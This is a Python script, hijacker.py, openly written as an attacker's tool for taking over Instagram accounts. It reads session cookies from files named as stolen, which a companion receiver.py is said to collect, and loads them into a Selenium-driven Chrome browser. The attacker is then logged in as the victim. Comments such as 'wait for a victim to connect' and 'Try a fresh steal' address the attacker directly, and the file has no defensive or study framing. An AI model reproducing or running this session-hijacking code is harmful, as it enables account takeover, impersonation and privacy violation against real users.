# ===== FILE: hijacker.py =====
# This runs on YOUR laptop (the attacker machine)
# It opens the victim's Instagram account in YOUR browser

import json
import os
import glob
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

def find_latest_cookie_file():
    """
    Finds the most recently saved cookie file in the current folder.
    Receiver.py saves files named: stolen_cookies_20260515_143022.txt
    """
    files = glob.glob("stolen_cookies_*.txt")
    if not files:
        print("[-] No stolen cookie files found!")
        print("[-] Run receiver.py first and wait for a victim to connect.")
        return None
    
    # Get the most recent file
    latest = max(files, key=os.path.getctime)
    return latest

def parse_cookie_file(filename):
    """
    Reads the cookie file and extracts the cookie values.
    Returns a dictionary like: {"sessionid": "...", "ds_user_id": "..."}
    """
    cookies = {}
    with open(filename, 'r') as f:
        lines = f.readlines()
    
    in_cookies_section = False
    for line in lines:
        line = line.strip()
        if line == "Cookies:":
            in_cookies_section = True
            continue
        if in_cookies_section and " = " in line:
            name, value = line.split(" = ", 1)
            cookies[name] = value
    
    return cookies

def hijack_session(cookies):
    """
    Opens Chrome on YOUR computer and injects the victim's cookies.
    After this, you'll see the victim's Instagram account.
    """
    
    if not cookies or 'sessionid' not in cookies:
        print("[-] No valid session cookie found!")
        return
    
    print("[+] Opening Chrome with victim's session...")
    
    # Set up Chrome options
    options = Options()
    # Remove this line if you want to see the browser window
    # options.add_argument("--headless=new")
    options.add_argument("--window-size=1200,800")
    
    # Launch Chrome
    driver = webdriver.Chrome(options=options)
    
    # FIRST: Go to Instagram (we need to be on the right domain to add cookies)
    driver.get("https://www.instagram.com")
    time.sleep(2)
    
    # SECOND: Add the stolen cookies one by one
    for name, value in cookies.items():
        cookie_dict = {
            'name': name,
            'value': value,
            'domain': '.instagram.com',
            'path': '/',
            'secure': True,
            'httpOnly': False  # Set to False so browser doesn't block it
        }
        try:
            driver.add_cookie(cookie_dict)
            print(f"[+] Added cookie: {name}")
        except Exception as e:
            print(f"[-] Could not add cookie {name}: {e}")
    
    # THIRD: Refresh — now you're logged in as the victim
    driver.get("https://www.instagram.com")
    time.sleep(3)
    
    # Check if it worked
    current_url = driver.current_url
    if "accounts/login" not in current_url and "login" not in current_url:
        print("[+] SUCCESS! You are now logged into the victim's account!")
        print(f"[+] Current page: {current_url}")
    else:
        print("[-] Cookie injection worked but redirected to login.")
        print("[-] The session may have expired. Try a fresh steal.")
    
    # The browser stays open so you can browse as the victim
    print("[+] Browser will stay open. Close it manually when done.")

# ===== START HERE =====
if __name__ == "__main__":
    import time  # Import here for the hijacker function
    
    print("="*60)
    print("  INSTAGRAM SESSION HIJACKER")
    print("="*60)
    
    # Find the latest stolen cookies file
    cookie_file = find_latest_cookie_file()
    if not cookie_file:
        exit()
    
    print(f"[+] Using cookie file: {cookie_file}")
    
    # Parse the cookies from the file
    cookies = parse_cookie_file(cookie_file)
    print(f"[+] Found cookies: {list(cookies.keys())}")
    
    # Hijack the session
    hijack_session(cookies)